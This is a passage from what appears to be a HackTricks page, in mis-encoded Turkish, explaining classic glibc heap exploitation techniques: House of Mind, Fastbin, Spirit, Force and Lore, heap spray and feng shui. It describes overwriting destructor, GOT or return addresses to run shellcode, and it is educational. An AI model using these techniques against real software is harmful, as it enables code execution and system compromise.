Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000 adresinde bir parÃ§ayÄ± kontrol edebilir ve **0x081002a0** adresinde bir parÃ§anÄ±n serbest bÄ±rakÄ±lacaÄŸÄ±nÄ± varsayarsak, 0x08100000 adresine ulaÅŸabilir ve istediÄŸimiz ÅŸeyi yazabiliriz, Ã¶rneÄŸin **0x0804a000**. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap\_for\_ptr(ptr)->ar\_ptr'yi 0x08100000 adresinde yazdÄ±ÄŸÄ±mÄ±zÄ± gÃ¶recektir (Ã§Ã¼nkÃ¼ Ã¶nce bahsettiÄŸimiz and iÅŸlemi uygulanÄ±r ve buradan ilk 4 baytÄ±n deÄŸeri, ar\_ptr'yi Ã§Ä±karÄ±r).

\_int\_free(ar\_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Ã–nceki bÃ¶lÃ¼mde av deÄŸerini kontrol edebileceÄŸimizi gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi.

unsorted\_chunks nasÄ±l tanÄ±mlandÄ±ÄŸÄ±na gÃ¶re biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle, av->bins\[2] adresine \_\_DTOR\_END\_\_-12 deÄŸerini yazarsak, son talimatta \_\_DTOR\_END\_\_ adresine ikinci parÃ§anÄ±n adresi yazÄ±lacaktÄ±r.

Yani, ilk parÃ§ada baÅŸlangÄ±ca \_\_DTOR\_END\_\_-12 adresini birÃ§ok kez yazmalÄ±yÄ±z Ã§Ã¼nkÃ¼ av->bins\[2] buradan alacaktÄ±r.

Ä°kinci parÃ§ada ve ilk parÃ§anÄ±n yardÄ±mÄ±yla prev\_size'Ä± bir sÄ±Ã§rama 0x0c ve boyutu NON\_MAIN_ARENA'yÄ± etkinleÅŸtirecek bir deÄŸerle Ã¼zerine yazÄ±yoruz.

ArdÄ±ndan, ikinci parÃ§aya bir sÃ¼rÃ¼ nops ve sonunda shellcode ekliyoruz.

Bu ÅŸekilde \_int\_free(TROZO1, TROZO2) Ã§aÄŸrÄ±lacak ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazÄ±lacaktÄ±r, bu da shellcode'a atlayacaktÄ±r.
Bu tekniÄŸi uygulamak iÃ§in payload'u biraz daha karmaÅŸÄ±k hale getiren bazÄ± gereksinimlerin karÅŸÄ±lanmasÄ± gerekmektedir.

Bu teknik artÄ±k uygulanabilir deÄŸil Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yama uygulandÄ±. Yeni hedef siteye iÅŸaret edilip edilmediÄŸi kontrol edilir.

**Fastbin**

The house of mind'in bir varyantÄ±dÄ±r.

\_int\_free() fonksiyonunun ilk kontrolÃ¼nden sonra aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rmak istiyoruz:

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Bu ÅŸekilde, "fb" adresi GOT'taki bir fonksiyonun adresini verirse, bu adrese Ã¼zerine yazÄ±lacak olan parÃ§a adresi konulacaktÄ±r. Bunun iÃ§in, arena'nÄ±n dtors adreslerine yakÄ±n olmasÄ± gerekecektir. Daha doÄŸrusu, av->max\_fast'in Ã¼zerine yazÄ±lacak olan adres olmasÄ± gerekmektedir.

The House of Mind ile kontrol edildiÄŸi gibi, av'nin konumunu kontrol ettiÄŸimizi gÃ¶rdÃ¼k.

Bu durumda, boyut alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu girersek â€”> fastbin\_index() bize fastbins\[-1] dÃ¶ndÃ¼recektir, bu da av->max\_fast'e iÅŸaret edecektir.

Bu durumda av->max\_fast'in Ã¼zerine yazÄ±lacak (iÅŸaret edilen deÄŸil, Ã¼zerine yazÄ±lacak olan pozisyon) adres olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 8 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z gerekmektedir (ayrÄ±ca shellcode'un serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼rsek, sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen baÅŸÄ±na bir jmp koymamÄ±z gerekecektir).

AyrÄ±ca, aynÄ± sahte parÃ§anÄ±n av->system\_mem'den kÃ¼Ã§Ã¼k olmasÄ± gerekmektedir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayÄ±da adres nedeniyle, bu bÃ¶lÃ¼mlerin hiÃ§biri Ã¼zerine yazÄ±lacak uygun bir adres olmadÄ±ÄŸÄ±ndan, pili hedeflemek iÃ§in fastbin'i nasÄ±l uygulayacaÄŸÄ±mÄ±za bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± ÅŸekli, **av**'yi pile yÃ¶nlendirmektir.

Boyutu 8 yerine 16 yapacak ÅŸekilde boyutu deÄŸiÅŸtirirsek: fastbin\_index() bize fastbins\[0] dÃ¶ndÃ¼recektir ve bunu pile yazmak iÃ§in kullanabiliriz.

Bunun iÃ§in pile hiÃ§bir canary veya garip deÄŸer olmamalÄ±dÄ±r, aslÄ±nda ÅŸu ÅŸekilde olmalÄ±dÄ±r: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese iÅŸaret edeceÄŸi ve bir **av**'nin ilk Ã¶ÄŸesinin 0 olmasÄ± gereken mutexe iÅŸaret etmesi gerekmektedir.

**av->max\_fast** EBP olacak ve bizi kÄ±sÄ±tlamalardan geÃ§irecek bir deÄŸer olacaktÄ±r.

**av->fastbins\[0]** adresi **p**'nin adresiyle Ã¼zerine yazÄ±lacak ve RET olacaktÄ±r, bÃ¶ylece shellcode'a atlanacaktÄ±r.

AyrÄ±ca, **av->system\_mem** (pile gÃ¶re 1484 bayt yukarÄ±da) bize izin verecek kadar Ã§ok Ã§Ã¶p olmalÄ±dÄ±r.

Serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 16 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z gerekmektedir (ayrÄ±ca shellcode'un serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼rsek, sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen baÅŸÄ±na bir jmp koymamÄ±z gerekecektir).

**The House of Spirit**

Bu durumda, saldÄ±rgan tarafÄ±ndan deÄŸiÅŸtirilebilen bir malloc iÅŸaretÃ§isine sahip bir malloc'a ihtiyaÃ§ vardÄ±r (Ã¶rneÄŸin, iÅŸaretÃ§inin bir deÄŸiÅŸken Ã¼zerindeki taÅŸmaya karÅŸÄ± stack'te olmasÄ±).

BÃ¶ylece, bu iÅŸaretÃ§inin istenilen yere iÅŸaret etmesini saÄŸlayabiliriz. Ancak, herhangi bir yer uygun deÄŸildir, sahte parÃ§anÄ±n boyutu av->max\_fast'ten kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak gelecekteki bir malloc() Ã§aÄŸrÄ±sÄ±nda istenen boyuta 8 eklenmelidir. Bu nedenle, eÄŸer bu savunmasÄ±z iÅŸaretÃ§iden sonra 40'a malloc(40) Ã§aÄŸrÄ±lacaÄŸÄ±nÄ± biliyorsak, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.

Ã–rneÄŸin, program kullanÄ±cÄ±dan bir sayÄ± istediÄŸinde 48 girebilir ve deÄŸiÅŸtirilebilir malloc iÅŸaretÃ§isini 4 sonraki byte'a (ÅŸans eseri EBP'ye ait olabilir, bÃ¶ylece 48 arkada kalÄ±r, sanki baÅŸlÄ±k boyutuymuÅŸ gibi) yÃ¶nlendirebiliriz. AyrÄ±ca, ptr-4+48 adresinin Ã§eÅŸitli koÅŸullarÄ± karÅŸÄ±lamasÄ± gerekmektedir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem.

Bu koÅŸullar saÄŸlandÄ±ÄŸÄ±nda, sÃ¶z konusu malloc Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda (malloc(40) olduÄŸunu sÃ¶ylediÄŸimizde), EBP'nin adresi olarak bu iÅŸaretÃ§i atanacaktÄ±r. SaldÄ±rgan ayrÄ±ca bu malloc'a ne yazÄ±lacaÄŸÄ±nÄ± kontrol edebiliyorsa, EBP ve EIP'yi istediÄŸi adrese Ã¼zerine yazabilir.

Bu, Ã§Ã¼nkÃ¼ free() bu stack'teki EBP'ye iÅŸaret eden bir parÃ§a olduÄŸunu hatÄ±rlayacak ve yeni malloc() iÃ§in rezerve edilmek istenen mÃ¼kemmel boyutta bir parÃ§a olduÄŸunu kaydedecektir, bu yÃ¼zden o adrese atayacaktÄ±r.

**The House of Force**

Gereksinimler:

* Wilderness'Ä± Ã¼zerine yazÄ±labilir hale getiren bir parÃ§a taÅŸmasÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan verilere sahip bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) Ã¼zerine yazmak gerekmektedir, bÃ¶ylece yeterince bÃ¼yÃ¼k bir bellek talebi \_int\_malloc() tarafÄ±ndan heap'i geniÅŸletmeden iÅŸlenecektir.

Ä°kinci olarak, av->top'un saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek bÃ¶lgesine, Ã¶rneÄŸin stack'e iÅŸaret etmesi gerekmektedir. av->top'a \&EIP - 8 konulacaktÄ±r.

SaldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek bÃ¶lgesine iÅŸaret eden av->top'u Ã¼zerine yazmak gerekmektedir:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresini (mevcut av->top) alÄ±r ve remainder tam olarak bu adresin malloc() tarafÄ±ndan talep edilen bayt sayÄ±sÄ± kadar ilerisine iÅŸaret eder. Bu nedenle, \&EIP-8'in 0xbffff224 olduÄŸu ve av->top'un 0x080c2788 olduÄŸu durumda, av->top'un bir sonraki malloc() iÃ§in \&EIP-8'e iÅŸaret etmesi gereken kontrol edilen malloc iÃ§in rezerve edilmesi gereken bayt miktarÄ± ÅŸudur:

0xbffff224 - 0x080c2788 = 3086207644.

Bu ÅŸekilde, deÄŸiÅŸtirilmiÅŸ deÄŸer av->top'a kaydedilir ve bir sonraki malloc EIP'ye iÅŸaret eder ve Ã¼zerine yazÄ±labilir.

Yeni wilderness parÃ§asÄ±nÄ±n boyutunun, son malloc() tarafÄ±ndan yapÄ±lan talepten daha bÃ¼yÃ¼k olmasÄ± gerekmektedir. Yani, wilderness \&EIP-8'e iÅŸaret ediyorsa, boyut tam olarak stack'teki EBP alanÄ±nda kalacaktÄ±r.

**The House of Lore**

**SmallBin BozulmasÄ±**

Serbest bÄ±rakÄ±lan parÃ§alar, boyutlarÄ±na gÃ¶re bir bine yerleÅŸtirilir. Ancak, unsorted bins'e Ã¶nce yerleÅŸtirilirler. Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda hemen bine konulmaz, unsorted bins'te kalÄ±r. ArdÄ±ndan, yeni bir parÃ§a rezerve edilirse ve Ã¶nceki serbest bÄ±rakÄ±lan parÃ§a yeterliyse geri verilir, ancak daha bÃ¼yÃ¼k bir parÃ§a rezerve edilirse, unsorted bins'teki serbest bÄ±rakÄ±lan parÃ§a uygun bine konulur.

ZararlÄ± kodun ulaÅŸÄ±labilmesi iÃ§in bellek talebi av->max\_fast'ten bÃ¼yÃ¼k (genellikle 72) ve MIN\_LARGE\_SIZE'dan kÃ¼Ã§Ã¼k (512) olmalÄ±dÄ±r.

EÄŸer bine uygun boyutta bir parÃ§a varsa, bu parÃ§a Ã§Ã¶zÃ¼mlendikten sonra geri verilir:

bck = victim->bk; Ã–nceki parÃ§aya iÅŸaret eder, deÄŸiÅŸtirebileceÄŸimiz tek bilgidir.

bin->bk = bck; Ã–nceki parÃ§a son parÃ§a olur, bck stack'e iÅŸaret ediyorsa, bir sonraki rezerve edilen parÃ§aya bu adres verilecektir.

bck->fd = bin; Liste kapatÄ±lÄ±r ve bu bin'e iÅŸaret eder.

Gereksinimler:
Ä°ki malloc ayrÄ±lmalÄ±, bÃ¶ylece ikincisi serbest bÄ±rakÄ±ldÄ±ktan sonra ilkine taÅŸma yapÄ±labilir (yani taÅŸma yapmadan Ã¶nce ikinci parÃ§a serbest bÄ±rakÄ±lÄ±p binine yerleÅŸtirilmiÅŸ olmalÄ±dÄ±r).

SaldÄ±rgan tarafÄ±ndan seÃ§ilen adresi alan malloc ayrÄ±lmÄ±ÅŸ olmalÄ±.

AmacÄ±mÄ±z ÅŸudur: EÄŸer bir heap'e taÅŸma yapabilirsek ve altÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ ve binine yerleÅŸtirilmiÅŸ bir parÃ§a varsa, bk iÅŸaretÃ§isini deÄŸiÅŸtirebiliriz. Bk iÅŸaretÃ§isini deÄŸiÅŸtirirsek ve bu parÃ§a binin listenin ilk parÃ§asÄ± haline gelirse ve ayrÄ±ldÄ±ÄŸÄ±nda, bin yanÄ±ltÄ±lacak ve bir sonraki parÃ§anÄ±n (sunulan) yanlÄ±ÅŸ adreste olduÄŸuna inanacak (Ã¶rneÄŸin stack veya GOT'a). Bu durumda baÅŸka bir parÃ§a ayrÄ±ldÄ±ÄŸÄ±nda ve saldÄ±rganÄ±n izinleri varsa, istenen konumda bir parÃ§a alacak ve iÃ§ine yazabilecektir.

DeÄŸiÅŸtirilen parÃ§anÄ±n serbest bÄ±rakÄ±ldÄ±ktan sonra serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmalÄ±, bÃ¶ylece deÄŸiÅŸtirilen parÃ§a sÄ±ralanmamÄ±ÅŸ binlerden Ã§Ä±kar ve binine yerleÅŸtirilir.

Binine yerleÅŸtirildikten sonra, taÅŸma yaparak bk iÅŸaretÃ§isini deÄŸiÅŸtirmek iÃ§in zamanÄ± gelir, bÃ¶ylece bin, malloc() yeterince Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda deÄŸiÅŸtirilmiÅŸ bin'i tekrar kullanÄ±r ve bir sonraki parÃ§anÄ±n yanlÄ±ÅŸ adreste olduÄŸuna inanÄ±r. Ve ardÄ±ndan istenen parÃ§a verilir.

Bu zafiyetin mÃ¼mkÃ¼n olan en kÄ±sa sÃ¼rede gerÃ§ekleÅŸmesi iÃ§in ideal olan ÅŸudur: Zafiyetli parÃ§anÄ±n ayrÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§anÄ±n ayrÄ±lmasÄ±, bu parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ±, parÃ§a deÄŸiÅŸtirilir (zafiyet), zafiyetli parÃ§adan aynÄ± boyutta bir parÃ§a ayrÄ±lmasÄ± ve zafiyetli parÃ§adan aynÄ± boyutta ikinci bir parÃ§a ayrÄ±lmasÄ± ve bu parÃ§a seÃ§ilen adrese iÅŸaret edecek ÅŸekilde olmalÄ±dÄ±r.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, tipik olarak "yanlÄ±ÅŸ" parÃ§anÄ±n kontrolÃ¼ yapÄ±lÄ±r: bck->fd'nin victim'a iÅŸaret etmediÄŸi kontrol edilir. Yani, bizim durumumuzda, stack'te iÅŸaret edilen yanlÄ±ÅŸ parÃ§anÄ±n fd\* iÅŸaretÃ§isinin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Bu korumayÄ± aÅŸmak iÃ§in saldÄ±rganÄ±n, uygun ÅŸekilde (muhtemelen stack Ã¼zerinden) victim'Ä±n adresini yazabilmesi gerekir. BÃ¶ylece gerÃ§ek bir parÃ§a gibi gÃ¶rÃ¼nÃ¼r.

**LargeBin BozulmasÄ±**

Ã–nceki gereksinimlerin yanÄ± sÄ±ra, ayrÄ±lan parÃ§alarÄ±n 512'den bÃ¼yÃ¼k olmasÄ± gerekir.

SaldÄ±rÄ±, Ã¶ncekiyle aynÄ±dÄ±r, yani bk iÅŸaretÃ§isini deÄŸiÅŸtirmek gereklidir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu deÄŸiÅŸtirmek gereklidir, bÃ¶ylece bu boyut - nb < MINSIZE olmalÄ±dÄ±r.

Ã–rneÄŸin, boyutu 1552 olarak ayarlamak, 1552 - 1544 = 8 < MINSIZE olacak ÅŸekilde yapÄ±lmalÄ±dÄ±r (Ã§Ä±karma negatif olmamalÄ± Ã§Ã¼nkÃ¼ unsigned karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r).

AyrÄ±ca, daha da karmaÅŸÄ±k hale getirmek iÃ§in bir yama eklenmiÅŸtir.

**Heap Spreyi**

Temelde, mÃ¼mkÃ¼n olan tÃ¼m belleÄŸi heap'ler iÃ§in ayÄ±rmak ve bunlarÄ± noplardan oluÅŸan bir shellcode ile doldurmaktÄ±r. AyrÄ±ca, bir yastÄ±k olarak 0x0c kullanÄ±lÄ±r. Yani 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bÃ¶ylece bu yastÄ±kla Ã§aÄŸrÄ±lacak bir adres Ã¼zerine yazÄ±lÄ±rsa oraya atlayacaktÄ±r. Temel olarak taktik, birÃ§ok ÅŸeyi ayÄ±rmak ve bir noktaya atlamak iÃ§in 0x0c0c0c0c adresine atlamayÄ± ummaktÄ±r.

**Heap Feng Shui**

BelleÄŸi parÃ§alar arasÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ parÃ§alarÄ±n kaldÄ±ÄŸÄ± ÅŸekilde sementlemek iÃ§in rezervasyonlar ve serbest bÄ±rakmalar kullanmaktÄ±r. TaÅŸmayÄ± yapÄ±lacak tampon bir yumurtanÄ±n iÃ§ine yerleÅŸtirilir.

## Ä°lginÃ§ Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.**

</details>
